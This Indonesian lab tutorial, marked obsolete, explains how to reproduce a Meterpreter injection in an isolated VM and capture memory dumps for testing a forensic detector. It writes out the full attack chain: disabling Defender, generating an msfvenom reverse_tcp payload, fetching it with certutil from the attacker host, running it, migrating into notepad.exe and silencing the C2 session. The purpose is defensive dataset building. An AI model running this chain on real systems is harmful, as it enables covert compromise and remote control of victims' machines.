> ⛔ USANG — JANGAN IKUTI FILE INI. Metode DumpIt terbukti GAGAL untuk dump
> besar (12 & 20 GB rusak, 10 Juli). Pengganti resmi:
> **tutorial_capture_vmem_10_16gb.md** (metode .vmem suspend, target 5/10/16 GB).
> File ini disimpan hanya sebagai catatan sejarah/prosedur r3 (TAHAP B-D masih
> valid sebagai referensi reproduksi injeksi).

# Tutorial Capture Dump 12 GB (r3 injection) — Langkah demi Langkah [USANG]

> Panduan praktis untuk dipakai sambil kerja di lab. Fokus SEKARANG: bikin
> `infected_r3_injection_12gb.raw`. Kalau ini sudah jadi dan deteksi terbukti TP,
> BARU lanjut ke 20 GB (tutorial terpisah / ulangi langkah sama, ganti RAM jadi
> 20480 MB dan nama berkas jadi `_20gb`).
>
> Ini mereproduksi skenario r3 injection yang SUDAH TERBUKTI di Dataset 5. Yang
> beda cuma RAM VM (jadi 12 GB) dan nama berkas output. Semua parameter lain
> WAJIB sama biar konsisten.
>
> Aturan hasil: setelah dump jadi, deteksi HARUS `notepad.exe -> SUSPICIOUS,
> R3=Y`. Kalau CLEAN semua berarti injeksi tak terbentuk saat capture -> ulang.

---

## ⚠️ WAJIB BACA — kenapa capture besar sebelumnya GAGAL (10 Juli)

Capture 12 GB & 20 GB percobaan pertama **RUSAK**: dump valid (header + notepad
target terbaca) tapi TIDAK LENGKAP. Plugin yang scan memori dalam gagal:

| Cek | 12 GB rusak | 20 GB rusak | 5 GB sehat |
|---|---|---|---|
| pslist | 24 proses | **5 proses** | ~179 |
| psscan | 83 | (parah) | ~179 |
| malfind | 0 segmen | 0 | 20 (2 notepad) |
| netscan | timeout | timeout | 42 dtk OK |
| Deteksi R3 | **GAGAL** | **GAGAL** | TP |

**Polanya jelas: makin besar dump makin rusak.** Ini bukan salah prosedur
injeksi (notepad target TERBUKTI ada di dump). Akar masalah: **DumpIt menulis
snapshot tak konsisten saat host tertekan** — VM besar + host jalan WSL/aplikasi
lain -> sisa RAM host menipis -> halaman memori berubah/ter-swap saat sedang
ditulis -> dump tak utuh.

**MAKA capture ulang WAJIB pakai langkah anti-korupsi berikut** (ini yang beda
dari percobaan gagal). Kalau langkah ini dilewati, besar kemungkinan rusak lagi:

1. **Idle-kan HOST total saat capture.** Di laptop host: TUTUP WSL (`wsl
   --shutdown` di PowerShell), tutup VS Code, browser, dan semua aplikasi berat.
   JANGAN jalankan analisis Volatility di host saat DumpIt sedang menulis. Host
   harus selega mungkin supaya RAM VM benar-benar teralokasi fisik.
2. **Kunci RAM VM di VMware (cegah ballooning/swap):** VM Settings > Options >
   Advanced, atau edit `.vmx` tambahkan:
   ```
   sched.mem.pin = "TRUE"
   MemTrimRate = "0"
   ```
   Ini memaksa VMware memberi RAM fisik penuh ke VM (tak di-page-share/balloon),
   sehingga DumpIt membaca memori nyata, bukan halaman kosong.
3. **Turunkan target ukuran.** 20 GB terbukti melewati batas -> DIBATALKAN.
   Target baru: **5 / 8 / 12 GB**. 5 GB sudah ada (sehat). Capture ulang: 8 & 12.
4. **Tulis dump ke disk yang lega & tunggu DumpIt benar-benar SELESAI** (jangan
   ganggu VM saat DumpIt jalan).
5. **WAJIB verifikasi dump SEBELUM tinggalkan lab** (lihat TAHAP G): jalankan
   cek cepat pslist. Kalau pslist < 100 proses -> dump RUSAK -> ulang di tempat,
   jangan tunggu sampai di rumah baru ketahuan.

Sisa tutorial di bawah tetap berlaku, dengan perubahan: **RAM 8 GB (8192 MB)
lalu 12 GB (12288 MB)**, nama output `_8gb` / `_12gb`.

---

## Ringkas alurnya (biar tahu arah)

1. Siapkan VM: restore snapshot bersih, set RAM 12 GB, host-only, Defender OFF.
2. Kali: siapkan payload meterpreter + handler.
3. Victim: buka notepad manual, jalankan payload, dapat sesi meterpreter.
4. Kali: `migrate` ke PID notepad (ini yang menanam RWX di notepad).
5. Kali: `sleep 300` (menutup socket C2 -> R2 diam, kode tetap resident).
6. Victim: DumpIt (Administrator) SELAGI sleep aktif -> tulis file 12 GB.
7. Catat ground truth (PID notepad), salin dump ke D:, buang snapshot infeksi.
8. Di WSL: jalankan `--timing`, verifikasi TP, ambil angka.

Target waktu: DumpIt nulis 12 GB butuh beberapa menit. Jendela `sleep 300` = 5
menit, cukup asal DumpIt dimulai segera setelah sleep.

---

## Parameter tetap (JANGAN diubah — harus sama Dataset 5)

| Hal | Nilai |
|---|---|
| Victim OS | Win10 Pro 22H2 build **19045.2965** |
| Victim IP | `192.168.70.130` (host-only, statis) |
| Attacker Kali IP | `192.168.70.131` (host-only, statis) |
| Jaringan | **host-only**, tanpa internet |
| Payload | `windows/x64/meterpreter/reverse_tcp`, LPORT **4444** |
| Proses target | **`notepad.exe`** (dibuka manual via Explorer) |
| Defender Real-time | **OFF** (prasyarat lab, setara T1562.001) |
| C2 sebelum capture | disenyapkan via `sleep 300` |
| Akuisisi | **DumpIt** sebagai Administrator |
| **RAM VM (INI YANG BEDA)** | **12 GB = 12288 MB** |
| **Nama output (INI YANG BEDA)** | `infected_r3_injection_12gb.raw` |

---

## TAHAP A — Siapkan VM (12 GB)

- [ ] **A1.** Di VMware: restore snapshot **`clean-base-attack-hostonly`**
      (snapshot #1, dibuat 03/07/2026 — Win10 build 19045.2965, sudah host-only
      dan sudah memuat IP statis victim `.130`). JANGAN pakai `clean-base-attack`
      (#2, 01/07) — itu versi lama tanpa IP statis, tiap restore dapat APIPA.
- [ ] **A2.** **Shutdown VM sepenuhnya** (Power > Shut Down Guest, bukan Suspend).
      RAM tak bisa diubah kalau VM cuma di-suspend.
- [ ] **A3.** VM Settings > Memory > set ke **12288 MB (12 GB)**. Simpan.
- [ ] **A4.** Cek RAM host: VM 12 GB dari host 32 GB menyisakan ~20 GB. Aman.
- [ ] **A5.** VM Settings > Network Adapter > pastikan **Host-only**, BUKAN
      NAT/Bridged. (Kalau perlu internet buat siapkan tool, boleh NAT dulu di
      TAHAP B lalu balik host-only sebelum capture.)
- [ ] **A6.** Nyalakan VM. Login user `forensic`.
- [ ] **A7.** Verifikasi IP statis victim. Snapshot `clean-base-attack-hostonly`
      **sudah memuat IP statis `.130`**, jadi biasanya langkah ini otomatis beres —
      cukup cek `ipconfig` harus menampilkan `192.168.70.130`. HANYA kalau ternyata
      masih APIPA (169.254.x.x), set manual di CMD Administrator:
      ```
      netsh interface ip set address name="Ethernet0" static 192.168.70.130 255.255.255.0
      ```
      (Sesuaikan nama adapter kalau bukan `Ethernet0` — cek `ipconfig`.)
- [ ] **A8.** Konfirmasi jaringan: dari victim `ping 192.168.70.131` harus jalan
      (Kali sudah statis `.131` via nmcli). Kalau tak balas, cek adapter/IP dua
      sisi dulu.
- [ ] **A9.** **Matikan Defender Real-time protection** di victim (Windows
      Security > Virus & threat protection > Manage settings > Real-time
      protection OFF). Tanpa ini payload meterpreter mentah kena signature.
      `MsMpEng.exe` tetap boleh jalan (itu jadi latar RWX realistis, sudah
      di-whitelist analyzer).

---

## TAHAP B — Siapkan payload & handler (di Kali)

- [ ] **B1.** Buat payload meterpreter (nama `AtlasHelper.exe` biar konsisten
      Dataset 5):
      ```
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.70.131 LPORT=4444 -f exe -o /tmp/AtlasHelper.exe
      ```
- [ ] **B2.** Beri izin baca supaya http.server bisa serve (Sliver/msf kadang
      simpan file mode ketat):
      ```
      chmod 644 /tmp/AtlasHelper.exe
      ```
- [ ] **B3.** Terminal Kali #2 — server unduhan di folder `/tmp`:
      ```
      cd /tmp && python3 -m http.server 8000
      ```
- [ ] **B4.** Terminal Kali #1 — buka msfconsole DULU (baris ini saja, tunggu
      sampai muncul prompt `msf6 >`):
      ```
      msfconsole -q
      ```
      ⚠️ JANGAN tempel semua perintah di bawah dalam satu baris di shell Kali —
      itu akan dibaca sebagai opsi command-line dan error `Invalid command line
      option`. Perintah berikut diketik SATU PER SATU di dalam prompt `msf6 >`
      (Enter tiap baris):
      ```
      use exploit/multi/handler
      set payload windows/x64/meterpreter/reverse_tcp
      set LHOST 192.168.70.131
      set LPORT 4444
      set ExitOnSession false
      exploit -j
      ```
      Harus muncul `Started reverse TCP handler on 192.168.70.131:4444`.

---

## TAHAP C — Jalankan injeksi (di Victim)

- [ ] **C1.** **Buka `notepad.exe` MANUAL lewat Explorer** — dobel klik di
      `C:\Windows\System32\notepad.exe` atau Start menu ketik "notepad". JANGAN
      spawn dari cmd/powershell. Ini bikin parent = `explorer.exe` (penting biar
      R1b tak salah menyala).
- [ ] **C2.** Catat PID notepad ini: buka Task Manager > Details, atau CMD:
      ```
      tasklist | findstr notepad
      ```
      Ingat PID-nya (nanti dipakai buat migrate & verifikasi ground truth).
- [ ] **C3.** Unduh payload dari Kali. Di CMD victim:
      ```
      certutil -urlcache -split -f http://192.168.70.131:8000/AtlasHelper.exe %TEMP%\AtlasHelper.exe
      ```
      (Kalau `certutil` gagal "Access is denied" -> Defender masih ON, balik ke
      A9.)
- [ ] **C4.** Jalankan payload:
      ```
      %TEMP%\AtlasHelper.exe
      ```
- [ ] **C5.** Di Kali handler: tunggu `Meterpreter session 1 opened`. Kalau tak
      muncul dalam ~10 detik: cek jaringan (ping), LHOST/LPORT, Defender.

---

## TAHAP D — Migrate ke notepad lalu senyapkan C2 (di Kali meterpreter)

- [ ] **D1.** Masuk sesi:
      ```
      sessions -i 1
      ```
- [ ] **D2.** Konfirmasi PID stager saat ini:
      ```
      getpid
      ```
- [ ] **D3.** Cari PID notepad (harus cocok C2 tadi):
      ```
      ps -S notepad.exe
      ```
- [ ] **D4.** **Migrate ke PID notepad** (ganti `<PID>` dengan hasil C2/D3):
      ```
      migrate <PID>
      ```
      Harus muncul `Migration completed successfully`. Ini yang menanam segmen
      `PAGE_EXECUTE_READWRITE + PrivateMemory` di notepad = artefak R3.
      Stager `AtlasHelper.exe` mati otomatis pasca migrate (tak ada noise \Temp\).
- [ ] **D5.** Konfirmasi sudah di notepad:
      ```
      getpid
      ```
      PID harus = PID notepad.
- [ ] **D6.** **Senyapkan C2** (tutup socket, kode tetap resident):
      ```
      sleep 300
      ```
      Muncul `Telling the target instance to sleep... session closed`. Mulai dari
      SINI kamu punya jendela ~5 menit tanpa koneksi ke Kali. **Segera lanjut ke
      TAHAP E, jangan menunda.**

---

## TAHAP E — Capture dump 12 GB (di Victim)

- [ ] **E1.** SELAGI jendela sleep aktif, jalankan **DumpIt sebagai
      Administrator** (klik kanan > Run as administrator).
- [ ] **E2.** Simpan output dengan nama **`infected_r3_injection_12gb.raw`**.
      (DumpIt default nulis ke folder tempat exe-nya; arahkan/ganti nama biar
      jelas. Pastikan disk tujuan lega — file ~12 GB.)
- [ ] **E3.** Tunggu DumpIt selesai (progress 100%, "Success"). Ini beberapa
      menit. Kalau `sleep 300` keburu habis dan C2 reconnect SEBELUM DumpIt
      selesai, tak fatal untuk R3 (kode tetap resident), tapi bisa memunculkan
      ESTABLISHED ke `.131` -> R2 ikut menyala -> tak konsisten Dataset 5. Kalau
      itu terjadi, ulang dari D6 (sleep lagi) lalu capture ulang.

---

## TAHAP F — Ground truth & bersih-bersih (SEBELUM matikan VM)

- [ ] **F1.** Di victim, catat ground truth:
      ```
      tasklist | findstr notepad
      ```
      Catat **PID notepad.exe** + konfirmasi PPID = explorer.exe (via Task
      Manager Details > kolom PPID, atau `wmic process where name="notepad.exe" get ProcessId,ParentProcessId`).
- [ ] **F2.** Catat di catatan lab: build OS (19045.2965), tanggal/jam capture,
      PID notepad, RAM VM = 12 GB.
- [ ] **F3.** Salin dump ke folder analisis:
      `D:\forensic_triase\dataset_update\infected_r3_injection_12gb.raw`.
      (Dari WSL nanti terlihat di `/mnt/d/forensic_triase/dataset_update/`.)
- [ ] **F4.** (Opsional) catat MD5 dump untuk integritas.
- [ ] **F5.** **Buang snapshot terinfeksi** — jangan biarkan VM terinfeksi hidup.
      Restore balik ke snapshot bersih setelah selesai.

---

## TAHAP F-VERIFIKASI — cek dump SEHAT sebelum tinggalkan lab (WAJIB, di WSL)

> Ini langkah BARU pasca-kegagalan 10 Juli. Jangan lewati. Cek cepat integritas
> dump SEBELUM kamu beres-beres lab, supaya kalau rusak bisa langsung capture
> ulang di tempat (bukan baru ketahuan di rumah).

- [ ] **FV1.** Jalankan cek cepat jumlah proses (ganti `_8gb`/`_12gb` sesuai):
      ```
      vol -f /mnt/d/forensic_triase/dataset_update/infected_r3_injection_12gb.raw windows.pslist 2>/dev/null | tail -n +2 | wc -l
      ```
- [ ] **FV2.** **Baca hasilnya:**
      - **≥ 120 proses** -> dump kemungkinan SEHAT, lanjut ke TAHAP G.
      - **< 100 proses** (apalagi < 30) -> dump **RUSAK / tak lengkap**. JANGAN
        dipakai. Ulang capture: perhatikan langkah anti-korupsi (idle host, pin
        RAM VMware). Ini persis kegagalan 12 GB (24 proses) & 20 GB (5 proses).
- [ ] **FV3.** (Cepat) konfirmasi notepad ada:
      ```
      vol -f .../infected_r3_injection_12gb.raw windows.pslist 2>/dev/null | grep -i notepad
      ```
      Harus muncul baris notepad.exe dengan PID = ground truth F1.

---

## TAHAP G — Jalankan timing & verifikasi (di WSL)

- [ ] **G1.** Jalankan analisis dengan timer, mode BERURUTAN (jangan --parallel):
      ```
      cd /home/kevin/forensic_triase/platform
      python3 main.py /mnt/d/forensic_triase/dataset_update/infected_r3_injection_12gb.raw --timing
      ```
- [ ] **G2.** **Cek deteksi:** output harus `PID <notepad> notepad.exe ->
      SUSPICIOUS, R3=Y` dan cocok PID ground truth F1. Kalau CLEAN semua ->
      injeksi tak terbentuk saat capture -> **ULANG dari TAHAP C**.
- [ ] **G3.** Ambil tabel durasi dari terminal + berkas
      `infected_r3_injection_12gb_timing.csv` (tertulis di sebelah dump, yaitu
      `/mnt/d/forensic_triase/dataset_update/`).
- [ ] **G4.** Catat **TOTAL** durasi & durasi **malfind** (diharapkan naik dari
      titik 5 GB: TOTAL 328,57 / malfind 134,47). Kabari aku angkanya, nanti aku
      isikan ke titik 12 GB di Tabel A.

---

## Jebakan yang bikin capture GAGAL (hindari)

1. **Migrate gagal / sesi mati sebelum capture** -> notepad tak punya RWX ->
   R3 tak menyala -> CLEAN semua -> ulang. (Konfirmasi D4 "Migration completed".)
2. **Lupa `sleep 300`** -> ada ESTABLISHED ke Kali saat capture -> R2 ikut
   menyala -> tak konsisten Dataset 5.
3. **notepad dibuka dari cmd, bukan Explorer** -> parent salah -> bisa memicu
   R1b -> tak konsisten. Selalu buka via Explorer/Start.
4. **Defender ON** -> meterpreter kena signature, payload gagal jalan
   (`certutil` "Access is denied").
5. **Lupa set IP statis victim** -> APIPA 169.254.x.x -> payload tak connect
   balik ke Kali. (TAHAP A7.)
6. **DumpIt telat dimulai** -> `sleep 300` habis, C2 reconnect saat capture ->
   R2 nyala. Mulai DumpIt segera setelah D6.
7. **Analisis pakai --parallel** saat timing -> angka durasi tak bersih. Selalu
   berurutan untuk uji skala.

---

## Kalau 12 GB sudah BERES -> lanjut 20 GB

Ulangi TAHAP A–G persis, dengan hanya 2 perubahan:
- **A3:** RAM VM = **20480 MB (20 GB)**. (Host 32 GB sisa ~12 GB — masih aman,
  jangan buka aplikasi berat lain di host saat capture.)
- **E2 / G1 / G3:** ganti semua `_12gb` jadi **`_20gb`**.

Analisis 20 GB bisa 40+ menit sekali jalan (malfind bisa lebih parah dari
linear). Boleh dijalankan sabar/di background. Setelah dapat angka 12 & 20 GB,
Tabel A & B tinggal diisi.
